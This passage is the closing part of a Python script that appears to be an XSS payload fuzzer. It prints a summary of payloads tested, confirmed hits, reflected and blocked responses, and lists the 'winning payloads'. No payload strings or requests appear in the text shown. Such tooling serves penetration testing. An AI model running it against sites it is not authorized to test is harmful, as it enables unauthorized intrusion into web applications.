    print(f'\n{C.BOLD}=========== SUMMARY ==========={C.R}')
    print(f'  Total tested : {progress.done} / {len(payloads)}   '
          f'{C.DIM}({rate:.1f} req/s){C.R}')
    print(f'  {C.GREEN}[+] Hits      : {len(hunt.hits)}{C.R}')
    print(f'  {C.YELLOW}[~] Reflected : {len(hunt.refl)}{C.R}')
    print(f'  {C.RED}[x] Blocked   : {hunt.blocked}{C.R}')
    print(f'  {C.MAG}[!] Errors    : {hunt.errors}{C.R}')
    print(f'  Time elapsed : {elapsed:.2f}s')
    if hunt.stop_event.is_set() and hunt.hits and not args.find_all:
        print(f'  {C.DIM}(stopped early on first hit - pass --all to enumerate every payload){C.R}')

    if hunt.hits:
        print(f'\n  {C.BOLD}{C.GREEN}WINNING PAYLOADS{C.R}')
        for idx, pl, st, label in hunt.hits:
            extra = ''
            if hunt.first_hit_idx == idx and hunt.first_hit_time is not None:
                extra = f'  {C.DIM}(found in {hunt.first_hit_time:.2f}s){C.R}'
            print(f'    #{idx} | {label} | status={st}{extra}')
            print(f'         {pl}')
        if args.output:
            print(f'\n  Saved to {C.CYAN}{args.output}{C.R}')
        return 0

    if hunt.refl and not args.grep:
        print(f'\n  {C.YELLOW}No confirmed XSS but {len(hunt.refl)} reflected - '
              f're-run with -v to inspect manually.{C.R}')
    elif args.grep:
        print(f'\n  {C.YELLOW}No payload made "{args.grep}" appear in the response.{C.R}')
        print(f'  Check the grep keyword and that --cookie is the active session.')
    return 1


if __name__ == '__main__':
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        sys.exit(130)
